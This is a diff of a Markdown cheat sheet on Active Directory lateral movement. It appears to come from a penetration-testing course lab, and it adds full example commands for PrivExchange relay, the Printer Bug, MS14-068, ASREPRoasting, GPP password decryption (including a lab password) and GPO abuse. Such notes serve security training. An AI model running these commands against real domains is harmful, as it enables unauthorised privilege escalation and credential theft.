@@ -1,4 +1,4 @@
-# Vulnerabilities & Misconfigurations in Active Directory Lateral Movement
+# Bleeding Edge Vulnerabilities & Misconfigurations in Active Directory Lateral Movement
 
 ---
 
@@ -105,65 +105,62 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA
 
 ## 2. Common Misconfigurations & Attacks
 
-### Table: Misconfigurations, Vulnerabilities, and Attacks
+### Table: Misconfigurations, Vulnerabilities, and Attacks (with Example Commands)
 
-| Misconfiguration / Vulnerability                | Attack / Abuse / Outcome                                 | Key Tools / Commands                                                                                   |
-|------------------------------------------------|----------------------------------------------------------|--------------------------------------------------------------------------------------------------------|
-| **Exchange Windows Permissions group**          | DCSync privilege escalation, domain compromise           | `net group "Exchange Windows Permissions" /domain`<br>BloodHound<br>PowerView                         |
-| **PrivExchange (Exchange PushSubscription flaw)**| Relay Exchange auth to LDAP, dump NTDS, DA access        | `privexchange.py`                                                                                      |
-| **Organization Management group**               | Full Exchange/OU control, mailbox access                 | BloodHound<br>PowerView                                                                               |
-| **Print Spooler enabled (MS-RPRN bug)**         | Printer Bug: NTLM relay to LDAP, DCSync, RBCD            | `rpcdump.py`<br>`SpoolSample.py`<br>`Get-SpoolStatus` (PowerShell)                                    |
-| **Unpatched MS14-068**                          | Kerberos PAC forgery, escalate to Domain Admin           | `PyKEK`<br>`impacket/ticket_converter.py`                                                             |
-| **Weak/default LDAP credentials in devices**    | Credential sniffing, initial foothold                    | `nc -lvp 389`<br>Change LDAP IP in device config                                                      |
-| **AD DNS zone readable by users**               | DNS record enumeration, host discovery                   | `adidnsdump -u user ldap://<dc-ip>`<br>`adidnsdump -r ...`                                            |
-| **Passwords in user Description/Notes fields**  | Credential discovery, lateral movement                   | `Get-DomainUser * | Select samaccountname,description`<br>PowerView                                   |
-| **PASSWD_NOTREQD flag set on accounts**         | Weak/no password, easy brute-force or login              | `Get-DomainUser -UACFilter PASSWD_NOTREQD`<br>PowerView                                               |
-| **SYSVOL/scripts readable by all**              | Passwords in scripts, privilege escalation               | `ls \\<dc>\SYSVOL\<domain>\scripts`<br>`cat \\<dc>\SYSVOL\<domain>\scripts\<file>`                   |
-| **GPP cpassword in SYSVOL**                     | Decrypt local admin passwords, lateral movement          | `gpp-decrypt <cpassword>`<br>`crackmapexec smb -M gpp_password`<br>`Get-GPPPassword.ps1`              |
-| **Registry.xml in SYSVOL**                      | Autologon credentials, lateral movement                  | `crackmapexec smb -M gpp_autologin`<br>`Get-GPPAutologon.ps1`                                         |
-| **Do not require Kerberos pre-auth (UAC flag)** | ASREPRoasting: offline password cracking                 | `Rubeus.exe asreproast ...`<br>`GetNPUsers.py`<br>`kerbrute`                                          |
-| **GPOs with weak ACLs**                         | GPO abuse: add local admin, run code, persistence        | `Get-DomainGPO`<br>`Get-ObjectAcl`<br>BloodHound<br>`SharpGPOAbuse`                                   |
-| **Password reuse across accounts**              | Lateral movement, privilege escalation                   | `crackmapexec smb ... --local-auth`<br>Password spraying tools                                        |
-| **Unconstrained/Constrained Delegation**        | Ticket theft, lateral movement, privilege escalation     | BloodHound<br>Rubeus<br>Impacket tools                                                                |
-| **AD CS misconfigurations**                     | ESC1-8 attacks, domain persistence/compromise            | `certipy`<br>ADCS enumeration scripts                                                                 |
+| Misconfiguration / Vulnerability                | Attack / Abuse / Outcome                                 | Example Commands / Tools                                                                                   |
+|------------------------------------------------|----------------------------------------------------------|------------------------------------------------------------------------------------------------------------|
+| **Exchange Windows Permissions group**          | DCSync privilege escalation, domain compromise           | `net group "Exchange Windows Permissions" /domain`<br>BloodHound<br>PowerView                              |
+| **PrivExchange (Exchange PushSubscription flaw)**| Relay Exchange auth to LDAP, dump NTDS, DA access        | `python3 privexchange.py -u user -p pass -d domain -t <exchange-server>`                                   |
+| **Organization Management group**               | Full Exchange/OU control, mailbox access                 | `net group "Organization Management" /domain`<br>BloodHound                                                |
+| **Print Spooler enabled (MS-RPRN bug)**         | Printer Bug: NTLM relay to LDAP, DCSync, RBCD            | `rpcdump.py @<target-ip> | grep MS-RPRN`<br>`Import-Module .\SecurityAssessment.ps1; Get-SpoolStatus -ComputerName <DC>`<br>`python3 SpoolSample.py <attacker-ip> <target-ip>` |
+| **Unpatched MS14-068**                          | Kerberos PAC forgery, escalate to Domain Admin           | `python ms14-068.py -u user -p pass -d domain -s <dc-ip>`                                                  |
+| **Weak/default LDAP credentials in devices**    | Credential sniffing, initial foothold                    | `nc -lvp 389`<br>Change LDAP IP in device/printer config                                                   |
+| **AD DNS zone readable by users**               | DNS record enumeration, host discovery                   | `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`<br>`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r` |
+| **Passwords in user Description/Notes fields**  | Credential discovery, lateral movement                   | `Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}`                             |
+| **PASSWD_NOTREQD flag set on accounts**         | Weak/no password, easy brute-force or login              | `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`                     |
+| **SYSVOL/scripts readable by all**              | Passwords in scripts, privilege escalation               | `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`<br>`cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs` |
+| **GPP cpassword in SYSVOL**                     | Decrypt local admin passwords, lateral movement          | `gpp-decrypt <cpassword>`<br>`crackmapexec smb -M gpp_password`<br>`Get-GPPPassword.ps1`                   |
+| **Registry.xml in SYSVOL**                      | Autologon credentials, lateral movement                  | `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`<br>`Get-GPPAutologon.ps1`            |
+| **Do not require Kerberos pre-auth (UAC flag)** | ASREPRoasting: offline password cracking                 | `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`<br>`GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users`<br>`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt` |
+| **GPOs with weak ACLs**                         | GPO abuse: add local admin, run code, persistence        | `Get-DomainGPO | select displayname`<br>`Get-DomainGPO | Get-ObjectAcl`<br>`SharpGPOAbuse.exe --AddLocalAdmin /GPOName:<GPO> /User:<user>`<br>BloodHound |
+| **Password reuse across accounts**              | Lateral movement, privilege escalation                   | `crackmapexec smb ... --local-auth`<br>Password spraying tools                                              |
+| **Unconstrained/Constrained Delegation**        | Ticket theft, lateral movement, privilege escalation     | BloodHound<br>Rubeus<br>Impacket tools                                                                      |
+| **AD CS misconfigurations**                     | ESC1-8 attacks, domain persistence/compromise            | `certipy`<br>ADCS enumeration scripts                                                                       |
 
 ---
 
-### Attack/Enumeration Flow
+### Example: Enumerating for Printer Bug (MS-RPRN) in PowerShell
 
-```mermaid
-graph TD
-  A[Find Misconfigurations] --> B[Enumerate with PowerView/BloodHound]
-  B --> C[Identify Vulnerable Groups, GPOs, SYSVOL, DNS, etc.]
-  C --> D[Exploit with Specific Tools (e.g., privexchange.py, Rubeus, CrackMapExec)]
-  D --> E[Escalate Privileges / Move Laterally]
-  E --> F[Document and Report]
+```powershell
+Import-Module .\SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```
 
----
+### Example: Enumerating DNS Records with adidnsdump
 
-### Tools
+```bash
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+```
 
-| Tool/Script         | Platform   | Use Case / Example Command                                  |
-|---------------------|------------|------------------------------------------------------------|
-| PowerView           | Windows    | AD enumeration, ACLs, user fields                          |
-| BloodHound          | Both       | Graph-based AD attack paths                                |
-| CrackMapExec        | Both       | GPP, autologon, password spray, share hunting              |
-| adidnsdump          | Linux      | Dump all AD DNS records                                    |
-| Rubeus              | Windows    | Kerberos ticket attacks (ASREPRoast, Kerberoast, etc.)     |
-| GetNPUsers.py       | Linux      | ASREPRoasting                                              |
-| kerbrute            | Linux      | User enumeration, ASREPRoasting                            |
-| gpp-decrypt         | Linux      | Decrypt GPP cpassword                                      |
-| SharpGPOAbuse       | Windows    | GPO privilege escalation                                   |
-| SpoolSample         | Both       | Trigger Print Spooler bug                                  |
-| privexchange.py     | Linux      | Exploit Exchange relay                                     |
+### Example: Finding Passwords in Description Field
 
----
+```powershell
+Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+```
 
-**How to use this section:**  
-- Start with enumeration (PowerView, BloodHound, adidnsdump, CrackMapExec).
-- Identify misconfigurations/vulnerabilities.
-- Use the corresponding attack tool/command to exploit.
-- Document all findings and outputs.
+### Example: GPP Password Decryption
 
----
+```bash
+gpp-decrypt <cpassword>
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
+```
+
+### Example: ASREPRoasting
+
+```powershell
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+```bash
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
